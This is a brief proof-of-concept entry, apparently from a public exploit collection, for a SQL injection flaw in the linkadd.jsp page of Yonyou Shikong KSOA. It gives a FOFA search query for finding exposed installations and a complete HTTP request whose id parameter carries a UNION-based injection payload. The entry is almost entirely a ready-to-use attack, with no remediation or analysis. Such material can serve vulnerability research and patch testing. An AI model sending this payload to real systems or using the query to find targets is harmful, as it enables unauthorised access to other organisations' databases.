## 用友时空KSOA-linkadd.jsp存在SQL注入漏洞

## fofa
```
title="企业信息系统门户"
```

## poc
```
GET /linksframe/linkadd.jsp?id=666666%27+union+all+select+null%2Cnull%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%27123456%27%29%29%2Cnull%2Cnull%2C%27 HTTP/1.1
Host: your-ip
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

![dddb6abed3843740aef1ca9d49b2b0f2](https://github.com/wy876/POC/assets/139549762/646894eb-bdd1-47a8-a54c-f3479030c97f)
